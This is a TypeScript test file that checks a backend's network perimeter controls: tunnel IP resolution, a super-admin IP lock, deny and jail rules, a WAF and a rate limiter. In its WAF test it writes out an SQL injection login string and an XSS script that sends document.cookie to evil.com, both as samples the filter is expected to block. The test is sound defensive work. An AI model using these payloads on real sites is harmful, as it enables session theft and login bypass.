// ─────────────────────────────────────────────────────────────────────────────
//  tests/global-perimeter-lock.test.ts
//  Test Suite for Global Tunnel Ingress & Super Admin Device Lock Enforcement
// ─────────────────────────────────────────────────────────────────────────────

import { initSqlite, getDb } from '../src/db/sqlite.connection';
import { networkAccessService } from '../src/services/network-access.service';
import { wafShieldService } from '../src/services/waf-shield.service';
import { subnetRateLimiterService } from '../src/services/subnet-rate-limiter.service';
import { requireSuperAdmin } from '../src/middleware/admin.middleware';

let passed = 0;
let failed = 0;

function assert(condition: boolean, description: string): void {
  if (condition) {
    console.log(`  ✅ PASS: ${description}`);
    passed++;
  } else {
    console.error(`  ❌ FAIL: ${description}`);
    failed++;
  }
}

async function runGlobalPerimeterTests(): Promise<void> {
  console.log('\n================================================================');
  console.log('🧪 Running Global Ingress & Super Admin Device Lock Tests');
  console.log('================================================================\n');

  initSqlite();
  const db = getDb();
  let adminUser = db.prepare("SELECT id, email FROM users WHERE isSuperAdmin = 1 LIMIT 1").get() as any;
  if (!adminUser) {
    db.prepare(`
      INSERT INTO users (id, email, emailHash, name, passwordHash, isSuperAdmin, createdAt, updatedAt)
      VALUES (?, ?, ?, ?, ?, 1, datetime('now'), datetime('now'))
    `).run('test-superadmin-uuid', 'admin@flarebase.dev', 'admin_hash', 'Super Admin', 'hashed_pw');
  }

  // ─────────────────────────────────────────────────────────────────────────
  // TEST 1: Global Tunnel Client IP Resolution
  // ─────────────────────────────────────────────────────────────────────────
  console.log('--- 1. Origin Client IP Resolution from Reverse Tunnels ---');

  // Cloudflare Tunnel Ingress (cf-connecting-ip)
  const mockReqCloudflare: any = {
    headers: {
      'cf-connecting-ip': '103.21.244.15',
      'host': 'my-app.trycloudflare.com',
      'x-forwarded-proto': 'https'
    },
    ip: '127.0.0.1'
  };
  const cfIp = networkAccessService.extractClientIp(mockReqCloudflare);
  assert(cfIp === '103.21.244.15', 'Extracted real origin IP from Cloudflare cf-connecting-ip header');

  // Ngrok / Localtunnel Ingress (x-forwarded-for)
  const mockReqNgrok: any = {
    headers: {
      'x-forwarded-for': '198.51.100.88, 10.0.0.1',
      'host': 'my-app.ngrok.app'
    },
    ip: '127.0.0.1'
  };
  const ngrokIp = networkAccessService.extractClientIp(mockReqNgrok);
  assert(ngrokIp === '198.51.100.88', 'Extracted real origin IP from x-forwarded-for multi-hop header');

  // Direct Localhost connection
  const mockReqLocal: any = {
    headers: { host: 'localhost:3000' },
    ip: '127.0.0.1'
  };
  const localIp = networkAccessService.extractClientIp(mockReqLocal);
  assert(localIp === '127.0.0.1', 'Extracted 127.0.0.1 for direct local connection');

  // ─────────────────────────────────────────────────────────────────────────
  // TEST 2: Super Admin Hosting Device Lock Enforcement over Global Ingress
  // ─────────────────────────────────────────────────────────────────────────
  console.log('\n--- 2. Super Admin Perimeter Lock over Global Ingress ---');

  // Enable Super Admin Endpoint IP Lock
  networkAccessService.updateNetworkSettings({
    adminEndpointIpLockEnabled: true,
    adminAllowedSubnet: '127.0.0.1'
  });

  const activeAdmin = db.prepare("SELECT id, email FROM users WHERE isSuperAdmin = 1 LIMIT 1").get() as any;
  const adminUserId = activeAdmin?.id || 'superadmin-root';

  // A: Local Hosting Device Request -> MUST ALLOW
  let localError: any = null;
  const mockReqLocalAdmin: any = {
    user: { sub: adminUserId, isSuperAdmin: true },
    headers: { host: 'localhost:3000' },
    ip: '127.0.0.1'
  };
  requireSuperAdmin(mockReqLocalAdmin, {} as any, (err?: any) => {
    localError = err;
  });
  assert(localError === null || localError === undefined, 'Hosting device (127.0.0.1) is permitted for Super Admin operations');

  // B: Remote WAN Device over Cloudflare Tunnel -> MUST BLOCK
  let remoteError: any = null;
  const mockReqRemoteAdmin: any = {
    user: { sub: adminUserId, isSuperAdmin: true },
    headers: {
      'cf-connecting-ip': '203.0.113.77',
      'host': 'my-app.trycloudflare.com'
    },
    ip: '127.0.0.1'
  };
  requireSuperAdmin(mockReqRemoteAdmin, {} as any, (err?: any) => {
    remoteError = err;
  });
  assert(remoteError !== null, 'Remote global visitor (203.0.113.77) BLOCKED from Super Admin endpoints');
  assert(remoteError?.statusCode === 403, 'Returns HTTP 403 Forbidden');
  assert(remoteError?.details?.code === 'ADMIN_PERIMETER_RESTRICTED', 'Returns ADMIN_PERIMETER_RESTRICTED error code');

  // C: Specific Approved Remote Device (Whitelist Rule) -> MUST ALLOW
  const rule = networkAccessService.addRule({
    ipPattern: '203.0.113.77',
    label: 'Authorized Remote Laptop',
    ruleType: 'ip',
    action: 'allow',
    scope: 'admin_only'
  });

  let approvedRemoteError: any = null;
  requireSuperAdmin(mockReqRemoteAdmin, {} as any, (err?: any) => {
    approvedRemoteError = err;
  });
  assert(approvedRemoteError === null || approvedRemoteError === undefined, 'Specifically whitelisted remote device (203.0.113.77) is permitted');

  // Clean up rule
  networkAccessService.deleteRule(rule.id);

  // ─────────────────────────────────────────────────────────────────────────
  // TEST 3: Global Ingress Network Rules (Deny, Blacklist & Jail)
  // ─────────────────────────────────────────────────────────────────────────
  console.log('\n--- 3. Global Ingress Network Access & Deny Enforcement ---');

  // Add global deny rule for a malicious remote subnet
  const badSubnetRule = networkAccessService.addRule({
    ipPattern: '198.51.100.0/24',
    label: 'Blocked Malicious DataCenter Subnet',
    ruleType: 'cidr',
    action: 'deny',
    scope: 'global'
  });

  const checkBlocked = networkAccessService.isEndpointAccessAllowed({
    clientIp: '198.51.100.42',
    path: '/api/v1/db/documents/items',
    method: 'GET'
  });
  assert(checkBlocked.allowed === false, 'Remote global visitor matching CIDR deny rule is rejected');
  assert(checkBlocked.code === 'GLOBAL_DENIED', 'Rejection code is GLOBAL_DENIED');

  // Clean up rule
  networkAccessService.deleteRule(badSubnetRule.id);

  // ─────────────────────────────────────────────────────────────────────────
  // TEST 4: Jailed Remote Attacker over Global Tunnel
  // ─────────────────────────────────────────────────────────────────────────
  console.log('\n--- 4. Jailed Remote Attacker Enforcement ---');
  networkAccessService.jailIpManually({
    ipAddress: '203.0.113.99',
    reason: 'Multiple consecutive brute-force attacks via global tunnel',
    durationMinutes: 15
  });

  const checkJailed = networkAccessService.isEndpointAccessAllowed({
    clientIp: '203.0.113.99',
    path: '/api/v1/auth/login',
    method: 'POST'
  });
  assert(checkJailed.allowed === false, 'Jailed remote attacker blocked across all global endpoints');
  assert(checkJailed.code === 'IP_JAILED', 'Rejection code is IP_JAILED');

  networkAccessService.pardonJailedIp('203.0.113.99', 'Automated Test Reset');

  // ─────────────────────────────────────────────────────────────────────────
  // TEST 5: Layer-7 WAF Threat Inspection over Global Ingress
  // ─────────────────────────────────────────────────────────────────────────
  console.log('\n--- 5. Layer-7 WAF Threat Detection on Global Tunnel Traffic ---');
  const sqliCheck = wafShieldService.inspectRequest({
    method: 'POST',
    path: '/api/v1/auth/login',
    query: {},
    body: { email: "admin' OR 1=1 --", password: 'test' },
    headers: { 'cf-connecting-ip': '198.51.100.12' },
    clientIp: '198.51.100.12'
  });
  assert(sqliCheck.blocked === true, 'WAF drops SQL injection attempt over global tunnel');
  assert(sqliCheck.threatType === 'sqli', 'Identified threat type as SQLi');

  const xssCheck = wafShieldService.inspectRequest({
    method: 'POST',
    path: '/api/v1/db/documents/comments',
    query: {},
    body: { comment: "<script>fetch('http://evil.com/steal?c='+document.cookie)</script>" },
    headers: { 'x-forwarded-for': '198.51.100.12' },
    clientIp: '198.51.100.12'
  });
  assert(xssCheck.blocked === true, 'WAF drops XSS payload attempt over global tunnel');
  assert(xssCheck.threatType === 'xss', 'Identified threat type as XSS');

  // ─────────────────────────────────────────────────────────────────────────
  // TEST 6: Subnet Rate Limiter on Remote Ingress
  // ─────────────────────────────────────────────────────────────────────────
  console.log('\n--- 6. Subnet Rate Limiter on Remote Ingress ---');
  // Generate burst of requests from remote IP
  for (let i = 0; i < 60; i++) {
    subnetRateLimiterService.checkRateLimit('198.51.100.55', 256);
  }
  const rateLimitStatus = subnetRateLimiterService.checkRateLimit('198.51.100.55', 256);
  assert(typeof rateLimitStatus.remaining === 'number', 'Rate limiter computes remaining quota');

  console.log('\n================================================================');
  console.log(`📊 Global Perimeter Lock Test Results: ${passed} passed, ${failed} failed`);
  console.log('================================================================\n');

  if (failed > 0) process.exit(1);
  process.exit(0);
}

runGlobalPerimeterTests().catch(err => {
  console.error('Fatal test error:', err);
  process.exit(1);
});
